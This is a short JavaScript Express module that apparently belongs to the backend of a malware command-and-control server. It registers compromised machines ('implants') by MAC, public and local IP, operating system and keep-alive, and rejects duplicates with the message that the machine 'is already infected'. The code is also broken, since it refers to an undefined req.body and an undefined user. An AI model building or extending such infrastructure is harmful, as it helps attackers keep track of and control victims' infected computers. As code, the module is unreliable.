import { response } from 'express'
import User from '../models/User_model.mjs';
import encrypt_passwd from './encrypt_passwd.mjs';
import new_jwt from './jwt.mjs';
import Implant from '../models/Implant_model.mjs';


const create_implant = async( body ) => {
    
    const { 
        impl_mac,
        impl_number,
        group,
        public_ip,
        local_ip,
        keep_alive,
        operating_system,
        token
    } = body;

    let implan_by_model = await Implant.findOne({ impl_mac });

    let errors=[];

    if( implan_by_model ) errors.push("El equipo ya esta infectado");

    if(errors.length > 0) return { errors, jwt:false };

    const implant = new Implant({ ...req.body });                                          //Create model
    await implant.save();                                                               // <--- Save user in database
    const jwt = await new_jwt( user.id, user.user_name );

    return {errors, jwt};
        
}


export { create_implant }